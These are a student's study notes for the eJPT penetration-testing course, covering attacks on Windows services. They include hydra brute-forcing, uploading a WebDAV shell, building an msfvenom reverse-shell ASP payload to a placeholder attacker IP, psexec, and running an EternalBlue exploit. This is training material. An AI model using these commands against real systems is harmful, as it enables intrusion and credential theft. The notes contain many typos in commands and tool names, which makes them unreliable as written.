# 08hakr's Short Notes eJPT
# 006 INE-Host-and-Network-Penetration-Testing-System-Host Based-Attacks

## Host Based Attacks
## Windows Vulnerabilities
- Conflicker MS08-067, EternalBlue Ms17-010, 
- information Disclosure
- buffer OVerflow
- RCE
- Privilege Escalation
- DOS System host Resources CPU RAM Network

## Frequently Exploited Windows Services 
### Microsoft IIS 80 443
 - .asp, .aspx, .config, .php
- WebDav 80 443
 - dattest and cadaver
 - snmap -sV -p80 --script=http-enum <target-ip>
 - hydra -L /usr/share/wordlists/metasploit/common_users.txt -P common_password <target-ip> http-get /webdav/
 - davtest -auth bob:password_123321 -url http://<target-ip>/webdav/ 
 - cadaver http://<target-ip>/webdav
 - cd /usr/share/webshells/
 - getting Reverse shell with meteasplot
  - creating payload 
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f asp > shell.asp
  - upload file with cadaver
  - msfconsol
  - use multi/handler
  - set payload windows/meterpereter/reverse_tcp 
  - set same data LHOST LPOSRT
  - run
  - search IIS upload  ; //use this module to automate
 
### SMB CS 445
- PSEXEC
- search smb_login
- set user_file and password_file
- pse commaond   pasexec (metaspolite module)
- psexec.py Administrator@<target-ip> cmd.exe

### MS17-010 Eternal Blue SMB 445
- vulnerable Windows windows Vistsa, 7, server 2008, 8.1, server 2012, 10, server 2016
- exploit AutoBlue-MS17-10
- nmap -sV -p445 --script=smb-vuln-ms17-010 <target-ip>
- shell_prep.sh
- python eternalblue_Exploit.py <target-ip> shellcode/sc_x64.bin
### RDP 3389
- nmap -sV <target-ip>
- msfconsole
- search rdp_scanner
- hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P unix_passwords.txt rdp://<target-ip> -s 3333 -t <speed-till-16>
- xfreerdp /u:administrator /p:<password> /v:<target-ip>:3333
### BLueKeep CVE-2019-0708 RDP Vulnerability RDP
- Vulnerable XP, Vista, 7, Server 2008 R2
- 

### WinRM 5986/443

